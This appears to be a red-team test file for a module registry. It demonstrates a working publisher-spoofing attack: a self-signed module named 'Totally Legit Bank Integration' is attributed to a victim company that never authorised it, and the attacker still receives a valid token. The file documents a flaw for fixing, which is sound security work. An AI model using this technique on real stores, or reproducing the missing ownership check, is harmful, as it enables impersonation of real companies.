// RED-TEAM rt02: self-certified module genesis lets ANYONE claim an arbitrary victim company as
// publisher_company_id. The store requires only that the publisher company EXISTS, never that the
// caller controls it. Result: identity spoofing — a module falsely attributed to a real company.
//
//   node --test tests/redteam/rt02_module_publisher_spoof.test.ts
import test from "node:test";
import assert from "node:assert/strict";
import { setup, makeCompany, draft, nowIso, generateKeyPair, log, type Env } from "./rt-helpers.ts";

let env: Env;
test.before(async () => { env = await setup(); });
test.after(async () => { await env.close(); });

test("J: attacker self-certifies a module whose publisher is a victim company it does not control", async () => {
  const victim = await makeCompany(env.base, "wb-victimco"); // a real company; attacker has no key for it

  // Attacker generates a brand-new module key and self-certifies (issuer.module_id == body.module_id),
  // setting publisher_company_id / subject / issuer.company_id all to the victim. No victim token is used.
  const modKp = await generateKeyPair();
  const moduleId = "wb-spoof-" + crypto.randomUUID().slice(0, 8);
  const now = nowIso();
  const unsigned = draft({
    type: "core.module",
    subject_company_id: victim.id,
    issuer: { key_id: modKp.keyId, company_id: victim.id, module_id: moduleId },
    visibility: "public",
    body: {
      module_id: moduleId,
      name: "Totally Legit Bank Integration",
      publisher_company_id: victim.id,   // <-- attacker attributes the module to the victim
      description: "impersonation",
      homepage: null,
      keys: [{ key_id: modKp.keyId, role: "root", label: "prod", status: "active", added_at: now, revoked_at: null, near_account: null }],
      requested_scopes: [],
    },
  });
  // Signed only by the attacker's own module key; the store verifies with the embedded public key.
  const r = await env.base.createModule(await (await import("../../src/sign.ts")).signRecord(unsigned, modKp.secretKey) as any);
  log("J created module", { module_id: r.module_id, publisher: (r.record.body as any).publisher_company_id });

  const view = await env.base.getModule(moduleId);
  assert.equal(view.publisher_company_id, victim.id,
    "CONFIRMED: a module now advertises the victim as its publisher, created without the victim's consent");
  // The attacker holds the module's token; the victim never authorized this identity.
  assert.ok(r.keys && r.keys.length === 1, "attacker received a working token for the spoofed module");
});
